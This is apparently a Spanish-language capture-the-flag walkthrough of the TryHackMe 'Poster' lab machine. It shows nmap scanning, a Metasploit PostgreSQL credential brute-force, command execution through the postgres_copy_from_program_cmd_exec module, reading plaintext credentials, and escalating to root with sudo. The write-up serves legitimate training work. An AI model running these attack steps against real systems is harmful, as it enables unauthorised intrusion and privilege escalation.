# Maquina Poster - TryHackme

* Nivel : Easy
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 10.10.133.30 (En mi caso)

## Escaneo de puertos

Primero abro metasploit, creo un espacio de trabajo y ejecuto un nmap
```bash
service postgresql start
msfconsole -q
workspace -a poster
db_nmap -sV -A -O -p- -Pn -T4 10.10.133.30
```

```bash
Nmap: 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
[*] Nmap: |   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
[*] Nmap: |_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
[*] Nmap: 80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Poster CMS
[*] Nmap: 5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
[*] Nmap: | ssl-cert: Subject: commonName=ubuntu
[*] Nmap: | Not valid before: 2020-07-29T00:54:25
[*] Nmap: |_Not valid after:  2030-07-27T00:54:25

```
Estan abiertos los puertos 80, 22 y el 5432. A primeras veo que las versiones del apache y el OpenSHH no estan en la base de datos de metasploit.
Asi que intentare buscar un exploit para el 5432 postgresql.

## Explotación

```bash
search postgresql
use auxiliary/scanner/postgres/postgres_login
show options
setg RHOSTS 10.10.133.30
run
```
Obtengo un user:password --> posgres:password. Ahora buscar un exploit para obtener una shell con este user.

```bash
search postgre type:exploit plataform:linux
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set LHOST ip
set PASSWORD password
run
Una vez conectado crear una shell
shell
/bin/bash -i

```

## Escalada de privilegios

```bash
Ahora ir al /home/dark y cat al credentials.txt
dark:qwerty1234#!hackme --> que es el user y la contraseña para acceder por el ssh
```

#### SSH -- user dark

```bash
ssh dark@10.10.133.30
/bin/bash -i
cd /var/www/html
cat config.php
$dbpass = "p4ssw0rdS3cur3!#";
```
Como estaba el puerto 80 revisar la carpeta web por si hay algo, en este caso si. Ahora su alison y poner la contraseña.

#### Escalada a root

```bash
con el user alison
sudo -l
Y tiene permiso de todo, entonces : 
sudo su
whoami
root
```

